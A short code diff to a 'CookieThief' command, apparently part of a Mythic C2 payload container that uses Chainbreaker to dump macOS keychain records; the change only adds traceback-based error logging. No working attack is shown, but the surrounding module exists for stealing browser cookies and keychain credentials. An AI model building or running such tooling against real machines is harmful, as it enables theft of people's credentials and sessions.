@@ -4,6 +4,7 @@ import os
 from mythic_payloadtype_container.MythicRPC import *
 import chainbreaker.chainbreaker
 from chainbreaker.chainbreaker import Chainbreaker
+import traceback
 
 class CookieThiefArguments(TaskArguments):
     def __init__(self, command_line):
@@ -93,7 +94,8 @@ class CookieThiefCommand(CommandBase):
 
 
         except Exception as e:
-            print("Chainbreaker script failed with error: " + str(e))
+            #print("Chainbreaker script failed with error: " + str(e))
+            traceback.print_exc()
             sys.stdout.flush()
 
         print(keychainoutput["records"])
